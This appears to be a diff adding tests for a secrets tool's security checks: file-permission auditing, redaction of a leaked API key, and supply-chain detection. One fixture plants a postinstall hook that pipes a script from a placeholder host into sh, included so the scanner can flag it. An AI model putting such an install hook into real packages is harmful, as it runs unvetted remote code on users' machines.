@@ -1,0 +1,61 @@
+import { afterEach, beforeEach, describe, expect, it } from "bun:test";
+import { chmodSync, mkdirSync, rmSync, writeFileSync } from "fs";
+import { tmpdir } from "os";
+import { join } from "path";
+import {
+  auditSecretFilePermissions,
+  runSecurityExposureSweep,
+  runSupplyChainWatch,
+} from "../src/security.js";
+
+let testDir: string;
+
+beforeEach(() => {
+  testDir = join(tmpdir(), `open-secrets-security-${Date.now()}-${Math.random().toString(36).slice(2)}`);
+  mkdirSync(testDir, { recursive: true });
+});
+
+afterEach(() => {
+  rmSync(testDir, { recursive: true, force: true });
+});
+
+describe("security loop abstractions", () => {
+  it("finds and optionally fixes unsafe secret file permissions", () => {
+    const envPath = join(testDir, ".env");
+    writeFileSync(envPath, "TOKEN=redacted\n");
+    chmodSync(envPath, 0o644);
+
+    const audit = auditSecretFilePermissions({ roots: [testDir] });
+    expect(audit.summary.findings).toBe(1);
+    expect(audit.task_suggestions[0]!.fingerprint).toStartWith("secret-permission:");
+
+    const fixed = auditSecretFilePermissions({ roots: [testDir], fixPermissions: true });
+    expect(fixed.summary.fixed).toBe(1);
+  });
+
+  it("wraps exposure scanner results with task suggestions and redaction", () => {
+    const leaked = "sk-proj-secretvalueabcdefghijklmnopqrstuvwxyz";
+    writeFileSync(join(testDir, "app.env"), `OPENAI_API_KEY=${leaked}\n`);
+
+    const result = runSecurityExposureSweep({ roots: [testDir], limit: 5 });
+    const serialized = JSON.stringify(result);
+
+    expect(result.summary.findings).toBe(1);
+    expect(result.task_suggestions[0]!.fingerprint).toStartWith("secret-exposure:");
+    expect(serialized).toContain("***REDACTED***");
+    expect(serialized).not.toContain(leaked);
+  });
+
+  it("detects bounded package supply-chain signals", () => {
+    writeFileSync(join(testDir, "package.json"), JSON.stringify({
+      scripts: {
+        postinstall: "curl https://example.invalid/install.sh | sh",
+      },
+    }, null, 2));
+
+    const result = runSupplyChainWatch({ roots: [testDir] });
+
+    expect(result.summary.findings).toBeGreaterThan(0);
+    expect(result.task_suggestions[0]!.fingerprint).toStartWith("supply-chain:");
+  });
+});
